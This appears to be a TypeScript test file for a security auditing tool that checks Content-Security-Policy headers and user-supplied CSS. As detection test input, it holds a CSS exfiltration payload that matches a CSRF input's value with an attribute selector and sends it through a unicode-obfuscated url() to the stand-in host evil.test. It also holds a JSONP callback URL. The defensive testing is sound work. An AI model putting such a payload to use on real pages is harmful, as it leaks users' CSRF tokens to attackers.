import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { auditCsp, evaluateExternalScript, parsePolicies } from '../src/csp.ts';
import { auditCss } from '../src/css.ts';

describe('End-to-end gateway audit workflow', () => {
  it('combines multi-header CSP intersection with obfuscated CSS exfiltration', async () => {
    // Two simultaneously enforced CSP headers: one strict, one permissive.
    const headers = [
      "script-src 'nonce-abc' 'strict-dynamic'; object-src 'none'; base-uri 'none'",
      "script-src 'unsafe-inline' https://www.google.com; object-src 'none'; base-uri 'none'",
    ];
    const csp = auditCsp(headers);

    // The weak second header is independently audited and reported.
    assert.ok(csp.findings.some((f) => f.code === 'UNSAFE_INLINE' && f.policyIndex === 1));
    assert.ok(csp.findings.some((f) => f.code === 'JSONP_OR_REDIRECT_SOURCE'));

    // Intersection keeps only sources present in every header.
    assert.deepEqual([...csp.merged.keys()].sort(), [
      'base-uri',
      'object-src',
      'script-src',
    ]);

    // External script from a JSONP sink is blocked by the strict header.
    const decision = evaluateExternalScript(
      parsePolicies(headers),
      'https://www.google.com/jsapi?callback=evil',
    );
    assert.equal(decision.allowed, false);

    // Obfuscated user-controlled style: unicode-escaped url() + sensitive
    // attribute selector, no JS required.
    const css = auditCss(
      'input[name*="csrf"][value^="a"]{ background:\\75 rl("https://evil.test/leak"); }',
      { allowedHosts: ['cdn.example.com'] },
    );
    assert.equal(css.allowed, false);
    assert.ok(css.findings.some((f) => f.code === 'ATTRIBUTE_EXFIL'));
    assert.ok(css.findings.some((f) => f.code === 'EXTERNAL_URL'));
  });

  it('passes a hardened policy and same-origin style fragment', () => {
    const csp = auditCsp(
      "default-src 'none'; script-src 'nonce-x' 'strict-dynamic'; object-src 'none'; base-uri 'none'; img-src 'self'; style-src 'self'",
    );
    assert.equal(csp.findings.length, 0);

    const css = auditCss(
      '.card { background: url("/assets/card.png"); color: #fff; }',
      { allowedHosts: ['cdn.example.com'] },
    );
    assert.equal(css.allowed, true);
  });
});
